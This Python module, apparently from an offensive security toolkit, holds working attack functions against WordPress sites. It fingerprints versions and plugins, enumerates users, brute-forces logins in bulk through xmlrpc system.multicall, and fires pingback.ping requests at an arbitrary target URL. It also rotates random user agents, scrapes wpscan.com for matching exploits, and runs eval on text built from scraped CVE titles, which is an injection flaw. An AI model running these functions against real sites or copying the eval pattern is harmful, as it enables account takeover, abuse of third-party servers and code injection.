import requests, random, json, sys,socket
import urllib3,time
from bane.vulns import vulners_search

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bane.payloads import ua

if sys.version_info < (3, 0):
    from urlparse import urlparse
else:
    from urllib.parse import urlparse

from bs4 import BeautifulSoup

#title="Contact Form 7 Captcha \u003c 0.1.2 - Reflected Cross-Site Scripting"



def wp_xmlrpc_methods(
    u, user_agent=None, cookie=None, path="/xmlrpc.php", timeout=10, proxy=None
):
    if u[len(u) - 1] == "/":
        u = u[0 : len(u) - 1]
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {"User-Agent": us}
    if cookie:
        hed.update({"Cookie": cookie})
    u += path
    post = """
 <?xml version="1.0" encoding="utf-8"?> 
<methodCall> 
<methodName>system.listMethods</methodName> 
<params></params> 
</methodCall>
"""
    try:
        r = requests.post(
            u, data=post, headers=hed, proxies=proxy, timeout=timeout, verify=False
        )
        return [
            x.replace("</string></value>", "").replace("<value><string>", "").strip()
            for x in r.text.split("<data>")[1].split("</data>")[0].strip().split("\n")
        ]
    except:
        pass
    return []


def wp_xmlrpc_bruteforce(
    u, user_agent=None, cookie=None, path="/xmlrpc.php", timeout=10, proxy=None
):
    if u[len(u) - 1] == "/":
        u = u[0 : len(u) - 1]
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {"User-Agent": us}
    if cookie:
        hed.update({"Cookie": cookie})
    u += path
    post = """
 <?xml version="1.0" encoding="utf-8"?> 
<methodCall> 
<methodName>system.listMethods</methodName> 
<params></params> 
</methodCall>
"""
    try:
        r = requests.post(
            u, data=post, headers=hed, proxies=proxy, timeout=timeout, verify=False
        )
        if "wp.getUsersBlogs" in [
            x.replace("</string></value>", "").replace("<value><string>", "").strip()
            for x in r.text.split("<data>")[1].split("</data>")[0].strip().split("\n")
        ]:
            return True
    except:
        pass
    return False


def wp_xmlrpc_mass_bruteforce(
    u, user_agent=None, cookie=None, path="/xmlrpc.php", timeout=10, proxy=None
):
    if u[len(u) - 1] == "/":
        u = u[0 : len(u) - 1]
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {"User-Agent": us}
    if cookie:
        hed.update({"Cookie": cookie})
    u += path
    post = """
 <?xml version="1.0" encoding="utf-8"?> 
<methodCall> 
<methodName>system.listMethods</methodName> 
<params></params> 
</methodCall>
"""
    try:
        r = requests.post(
            u, data=post, headers=hed, proxies=proxy, timeout=timeout, verify=False
        )
        l = [
            x.replace("</string></value>", "").replace("<value><string>", "").strip()
            for x in r.text.split("<data>")[1].split("</data>")[0].strip().split("\n")
        ]
        if ("wp.getUsersBlogs" in l) and ("system.multicall" in l):
            return True
    except:
        pass
    return False


def wp_xmlrpc_pingback(
    u,
    user_agent=None,
    test_url="https://www.google.com/",
    cookie=None,
    path="/xmlrpc.php",
    timeout=10,
    proxy=None,
):
    if u[len(u) - 1] == "/":
        u = u[0 : len(u) - 1]
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {"User-Agent": us}
    if cookie:
        hed.update({"Cookie": cookie})
    u += path
    post = """
 <?xml version="1.0" encoding="utf-8"?> 
<methodCall> 
<methodName>system.listMethods</methodName> 
<params></params> 
</methodCall>
"""
    try:
        r = requests.post(
            u, data=post, headers=hed, proxies=proxy, timeout=timeout, verify=False
        )
        l = [
            x.replace("</string></value>", "").replace("<value><string>", "").strip()
            for x in r.text.split("<data>")[1].split("</data>")[0].strip().split("\n")
        ]
        if "pingback.ping" in l:
            return True
    except:
        pass
    return False


def wp_xmlrpc_pingback_exploit(
    u,
    user_agent=None,
    target_url="https://www.google.com/",
    cookie=None,
    path="/xmlrpc.php",
    timeout=10,
    proxy=None,
):
    url = u.split("://")[0] + "://" + urlparse(u).netloc
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {"User-Agent": us}
    if cookie:
        hed.update({"Cookie": cookie})
    url += path
    post = (
        """<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value><string>"""
        + target_url
        + """</string></value>
</param>
<param>
<value><string>"""
        + u
        + """</string></value>
</param>
</params>
</methodCall>
"""
    )
    try:
        r = requests.post(
            url, data=post, headers=hed, proxies=proxy, timeout=timeout, verify=False
        )
    except:
        pass


def wpadmin(
    u,
    username,
    password,
    user_agent=None,
    cookie=None,
    path="/xmlrpc.php",
    timeout=10,
    proxy=None,
):
    """
    this function is to check the wordpress given logins using the xmlrpc.php file. if they are correct it returns True, else False"""
    if u[len(u) - 1] == "/":
        u = u[0 : len(u) - 1]
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {"User-Agent": us}
    if cookie:
        hed.update({"Cookie": cookie})
    u += path
    post = """<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>{}</value></param>
<param><value>{}</value></param>
</params>
</methodCall>""".format(
        username, password
    )
    try:
        r = requests.post(
            u, data=post, headers=hed, proxies=proxy, timeout=timeout, verify=False
        )
        if "isAdmin" in r.text:
            return True
    except:
        pass
    return False


def wpadmin_mass(
    u,
    word_list=[],
    user_agent=None,
    cookie=None,
    path="/xmlrpc.php",
    timeout=10,
    proxy=None,
):
    """
    this function is to check the wordpress given logins using the xmlrpc.php file. if they are correct it returns True, else False"""
    if u[len(u) - 1] == "/":
        u = u[0 : len(u) - 1]
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {"User-Agent": us}
    if cookie:
        hed.update({"Cookie": cookie})
    u += path
    post = """
 <?xml version="1.0"?>
<methodCall><methodName>system.multicall</methodName><params><param><value><array><data>
 """
    for x in word_list:
        post += """<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array>
  <data><value><array><data><value><string>{}</string></value><value><string>{}</string></value>
  </data></array></value></data></array></value></member></struct></value>
""".format(
            x.split(":")[0], x.split(":")[1]
        )
    post += """
</data></array></value></param></params></methodCall>
 """
    try:
        r = requests.post(
            u, data=post, headers=hed, proxies=proxy, timeout=timeout, verify=False
        )
        l = (
            r.text.split("<array><data>")[1]
            .split("</array></data>")[0]
            .strip()
            .split("</struct></value>")
        )
        for x in l:
            if "Incorrect username or password" not in x:
                return word_list[l.index(x)]
    except:
        pass
    return ""


def wp_users(
    u, path="/wp-json/wp/v2/users", timeout=10, user_agent=None, cookie=None, proxy=None
):
    """
    this function is to get WP users"""
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {"User-Agent": us}
    if cookie:
        hed.update({"Cookie": cookie})
    if u[len(u) - 1] == "/":
        u = u[0 : len(u) - 1]
    u += path
    try:
        r = requests.get(u, headers=hed, proxies=proxy, timeout=timeout, verify=False)
        if ('{"id":' in r.text) and ('"name":"' in r.text):
            a = json.loads(r.text)
            users = []
            for x in range(len(a)):
                users.append(
                    {"id": a[x]["id"], "slug": a[x]["slug"], "name": a[x]["name"]}
                )
            return users
    except Exception as e:
        return []
    return []


def wp_user(
    u,
    path="/wp-json/wp/v2/users/",
    user=1,
    user_agent=None,
    cookie=None,
    timeout=10,
    proxy=None,
):
    """
    this function is to return all informations about a WP user with a given index integer"""
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {"User-Agent": us}
    if cookie:
        hed.update({"Cookie": cookie})
    if u[len(u) - 1] == "/":
        u = u[0 : len(u) - 1]
    u += path + str(user)
    try:
        r = requests.get(u, headers=hed, proxies=proxy, timeout=timeout, verify=False)
        if ('{"id":' in r.text) and ('"name":"' in r.text):
            return json.loads(r.text)
    except Exception as e:
        pass


def wp_users_enumeration(
    u,
    path="/",
    timeout=15,
    user_agent=None,
    cookie=None,
    proxy=None,
    start=1,
    end=20,
    logs=True,
):
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {"User-Agent": us}
    if cookie:
        hed.update({"Cookie": cookie})
    d = u.split("://")[1].split("/")[0]
    u = u.split(d)[0] + d
    l = []
    for x in range(start, end + 1):
        try:
            r = requests.get(
                u + path + "?author=" + str(x),
                headers=hed,
                proxies=proxy,
                timeout=timeout,
                verify=False,
            ).text
            a = r.split('<meta property="og:title" content="')[1].split(">")[0]
            b=r.split('<meta property="og:url" content="')[1].split(">")[0]
            c=b.split('/author/')[1].split('/')[0]
            if "," in a:
                a = a.split(",")[0]
                l.append({'id':x, 'name':a,'slug':c})
                if logs == True:
                    print(
                        "[+] id: {} | name: {} | slug: {}".format(
                            x,#.encode("utf-8", "replace"), 
                            a,
                            c
                        )
                    )
        except KeyboardInterrupt:
            break
        except:
            pass
    return l


def wp_version(u, timeout=15, user_agent=None, cookie=None, proxy=None):
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {"User-Agent": us}
    if cookie:
        hed.update({"Cookie": cookie})
    try:
        r = requests.get(
            u, headers=hed, proxies=proxy, timeout=timeout, verify=False
        ).text
        return (
            r.split('<meta name="generator" content="')[1]
            .split('"')[0]
            .strip()
            .split(" ")[1]
        )
    except:
        pass




def extract_with_versions(cve_list,software_version):
    results = []
    for cve in cve_list:
        title = cve['title']
        try:
            version = [ x.strip() for x in title.split() if '.' in x and x.endswith('.')==False and x.startswith('.')==False][0]
        except:
            version=''
        if version!='':
            try:
                c=title.split(version)[0].split()
                if c[-1].strip()=='<':
                    comparison='<'
                elif c[-1].strip()=='<=':
                    comparison='<='
                else:
                    comparison='=='
            except:
                comparison='=='
        if version=='':
            version=software_version
        if eval('"{}"{}"{}"'.format(software_version,comparison,version))==True:
            results.append(cve)
    
    return results




def fetch_wp_exploits(s,max_tries=3,proxy=None,user_agent=None,timeout=15,cookie=None,sleep_time_min=10,sleep_time_max=20,when_blocked_sleep=30):
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {"User-Agent": us}
    if cookie:
        hed.update({"Cookie": cookie})
    i=1
    l=[]
    result=[]
    tries=0
    while True:
        tries+=1
        #print(tries)
        if tries==max_tries:
            break
        try:
            r=requests.get('https://wpscan.com/search?page={}&text={}'.format(i,s['name']),headers=hed,timeout=timeout,proxies=proxy,verify=False).text
            #print(r)
            data=json.loads(r.split('"pageData":{"props":{"data":')[1].split(',"metadata":{"pageCount":')[0])
            if len(data)==0:
                break
            l+=data
            i+=1
            tries=0
        except Exception as ex:
            #raise(ex)
            time.sleep(when_blocked_sleep)
        time.sleep(random.randint(sleep_time_min,sleep_time_max))
    for x in l:
        x['exploit_url']='https://wpscan.com/vulnerability/'+x['id']
    return extract_with_versions(l,s['version'])



def get_wp_infos(u,max_wpscan_tries=3,cookie=None,user_agent=None,timeout=15,proxy=None,user_enum_start=1,user_enum_end=20,wpscan_cookie=None,sleep_time_min=10,sleep_time_max=20,when_blocked_sleep=30,logs=True):
    domain=u.split('://')[1].split('/')[0]
    ip=socket.gethostbyname(domain)
    if u[len(u) - 1] == "/":
        u = u[0 : len(u) - 1]
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {"User-Agent": us}
    if cookie:
        hed.update({"Cookie": cookie})
    response = requests.get(u, headers=hed, proxies=proxy, timeout=timeout, verify=False)
    server=response.headers.get('Server','Unknown')
    backend=response.headers.get('X-Powered-By','Unknown')
    html_content = response.text

    # Parse the HTML content
    soup = BeautifulSoup(html_content, 'html.parser')

    # Find themes and plugins information
    themes = []
    plugins = []
    try:
        #print(response.split('<meta name="generator" content="')[1].split('"')[0])
        wp_version=response.text.split('<meta name="generator" content="')[1].split('"')[0].strip().split(" ")[1]
    except Exception as ex:
        #print(ex)
        wp_version=''
    # Extract themes
    if logs==True:
        print("WordPress site info:\n\n\tURL: {}\n\tDomain: {}\n\tIP: {}\n\tServer: {}\n\tBackend technology: {}\n\tWordPress version: {}\n".format(u,domain,ip,server,backend,wp_version))
    theme_links = soup.find_all('link', rel='stylesheet')
    for link in theme_links:
        href = link.get('href')
        #print(href)
        if 'themes' in href:
            try:
                theme_name = href.split('/themes/')[1].split('/')[0]
                try:
                    version=href.split('?')[1].split('=')[1]
                except:
                    version=''
                theme={'name':theme_name,'version':version}
                if theme not in themes:
                    themes.append(theme)
            except:
                pass
        elif 'plugins' in href:
            try:
                plugin_name = href.split('/plugins/')[1].split('/')[0]
                try:
                    version=href.split('?')[1].split('=')[1]
                except:
                    version=''
                plugin={'name':plugin_name,'version':version}
                if plugin not in plugins:
                    plugins.append(plugin)
            except:
                pass
    users_json_exposed=True
    json_path=u+'/wp-json/wp/v2/users'
    if logs==True:
        print('[i] Fetching users from: {}'.format(json_path))
    json_users=wp_users(u,timeout=timeout,cookie=cookie,user_agent=user_agent,proxy=proxy)
    if logs==True:
        for x in json_users:
            print('[+] id: {} | name: {} | slug: {}'.format(x['id'],x['name'],x['slug']))
        print()
    if json_users==[]:
        users_json_exposed=False
    can_enumerate_users=True
    enumerated_users= wp_users_enumeration(u,logs=logs,timeout=timeout,cookie=cookie,user_agent=user_agent,proxy=proxy,start=user_enum_start,end=user_enum_end)
    if enumerated_users==[]:
        can_enumerate_users=False
    if logs==True:
        print()
        print('[i] Checking if XMLRPC is enabled from: {}'.format(u+'/xmlrpc.php'))
    xmlrpcs=wp_xmlrpc_methods(u,timeout=timeout,cookie=cookie,user_agent=user_agent,proxy=proxy)
    can_b_u=("wp.getUsersBlogs" in xmlrpcs) and ("system.multicall" in xmlrpcs)
    can_pb="pingback.ping" in xmlrpcs
    if logs==True:
        if len(xmlrpcs)>0:
            print('[+] enabled')
            if can_b_u==True:
                print('[+] Vulnerable to users bruteforce')
            if can_pb==True:
                print('[+] Vulnerable to pingback')
        else:
            print('[-] disabled')
        print()
    wp_vulns=[]
    if wp_version!='':
        if logs==True:
            print('[i] looking for exploits for version: {}\n'.format(wp_version))
        wp_vulns=vulners_search('wordpress',version=wp_version)
        for x in wp_vulns:
            for i in ['cpe', 'cpe23', 'cwe', 'affectedSoftware']:
                try:
                    del x[i]
                except:
                    pass
        if logs==True:
            if len(wp_vulns)==0:
                print('[-] none was found')
            else:
                for x in wp_vulns:
                    print("Title : {}\n\tDescription: {}\n\tLink: {}".format(x['title'],x['description'],x['href']))
            print()
    if len(themes)>0:
        if logs==True:
            print('[i] looking for exploits for the themes:\n')
    for x in themes:
        if logs==True:
            print('[i] Theme: {} | Version: {}\n'.format(x['name'],x['version']))
        x['exploits']=fetch_wp_exploits(x,max_tries=max_wpscan_tries,proxy=proxy,user_agent=user_agent,timeout=timeout,cookie=wpscan_cookie,sleep_time_min=sleep_time_min,sleep_time_max=sleep_time_max,when_blocked_sleep=when_blocked_sleep)
        if logs==True:
            for i in x['exploits']:
                print("\tTitle: {}\n\tLink: {}".format(i['title'],i['exploit_url']))
            print()
    if len(plugins)>0:
        if logs==True:
            print()
            print('[i] looking for exploits for the plugins:\n')
    for x in plugins:
        if logs==True:
            print('[i] Plugin: {} | Version: {}\n'.format(x['name'],x['version']))
        x['exploits']=fetch_wp_exploits(x,max_tries=max_wpscan_tries,proxy=proxy,user_agent=user_agent,timeout=timeout,cookie=wpscan_cookie,sleep_time_min=sleep_time_min,sleep_time_max=sleep_time_max,when_blocked_sleep=when_blocked_sleep)
        if logs==True:
            for i in x['exploits']:
                print("\tTitle: {}\n\tLink: {}".format(i['title'],i['exploit_url']))
                print()
    return {'url':u,'domain':domain,'ip':ip,'Server':server,'backend_technology':backend,'wordpress_version':wp_version,'themes':themes,'plugins':plugins,'users_json_exposed':users_json_exposed,'exopsed_json_users':{'users':json_users,'path':json_path},'can_enumerate_users':can_enumerate_users,'enumerated_users':enumerated_users,'enabled_xmlrpc_methods':xmlrpcs,"xmlrpc_bruteforce_users":can_b_u,"pingback_enabled":can_pb,"exploits":wp_vulns}
